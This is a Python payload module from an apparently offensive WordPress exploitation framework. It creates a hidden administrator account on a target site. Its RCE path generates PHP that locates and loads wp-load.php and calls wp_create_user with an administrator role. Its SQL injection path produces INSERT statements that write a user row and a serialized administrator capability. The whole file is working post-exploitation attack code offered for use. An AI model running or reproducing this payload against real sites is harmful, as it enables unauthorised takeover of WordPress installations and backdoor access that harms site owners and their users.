"""
HWP Payload — Create Admin User

Creates a WordPress administrator account (or another role).
Supports RCE (PHP) and SQLI (statement/stacked INSERT injection).

SQLI (write-capable statement injection) is required for the SQL path — it runs
INSERT statements. A read-only SQLIq injection cannot create a user.

Options:
    --user      Username (default: random)
    --pass      Password (default: random)
    --email     Email (default: random)
    --role      Role to grant (default: administrator)
"""

import random
import string

from hwp import Payload


def _rand(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class AdminUser(Payload):
    name = "Create Admin User"
    methods = ["RCE", "SQLI"]
    description = "Create a WordPress admin (or chosen-role) account"
    options = [
        {"name": "user",  "default": "",  "help": "Username (blank = random)"},
        {"name": "pass",  "default": "",  "help": "Password (blank = random)"},
        {"name": "email", "default": "",  "help": "Email (blank = random)"},
        {"name": "role",  "default": "administrator", "help": "Role to grant"},
    ]

    def instructions(self):
        user = self.options.get("user", "") or _rand()
        password = self.options.get("pass", "") or _rand(12)
        email = self.options.get("email", "") or f"{_rand()}@{_rand()}.com"
        role = self.options.get("role", "") or "administrator"

        self.info("Creating user:")
        self.info(f"  Username: {user}")
        self.info(f"  Password: {password}")
        self.info(f"  Email:    {email}")
        self.info(f"  Role:     {role}")

        if self.method == "RCE":
            # wp_create_user() needs WordPress loaded. The instruction may run
            # inside WP (native RCE) or standalone (e.g. via an upload sink), so
            # locate and require wp-load.php when WP isn't already present.
            php = (
                '<?php '
                '$r=null; '
                'if(defined("ABSPATH")){$r=ABSPATH;} '
                'else{$d=dirname(__FILE__); for($i=0;$i<12;$i++){'
                'if(@file_exists($d."/wp-load.php")){$r=rtrim($d,"/")."/";break;} '
                '$p=dirname($d); if($p===$d)break; $d=$p;}} '
                'if($r && !function_exists("wp_create_user")){require $r."wp-load.php";} '
                f'$uid=wp_create_user("{user}","{password}","{email}"); '
                'if(is_wp_error($uid)){echo "FAILED ".$uid->get_error_message();} '
                'else{$u=new WP_User($uid); '
                f'$u->set_role("{role}"); '
                f'echo user_can($u,"{role}")?"Admin Created uid=".$uid:"FAILED role";}} '
                '?>'
            )
            return [php]

        elif self.method == "SQLI":
            cap = f'a:1:{{s:{len(role)}:"{role}";b:1;}}'
            return [
                (
                    f"INSERT INTO {{$wpdb->users}} SET "
                    f"`user_login`='{user}', "
                    f"`user_email`='{email}', "
                    f"`user_pass`=MD5('{password}')"
                ),
                (
                    f"INSERT INTO {{$wpdb->usermeta}} SET "
                    f"`user_id`='{{prev.insert_id}}', "
                    f"`meta_key`='wp_capabilities', "
                    f"`meta_value`='{cap}'"
                ),
            ]

    def report(self, results):
        if any(r.success for r in results):
            self.success("User created successfully")
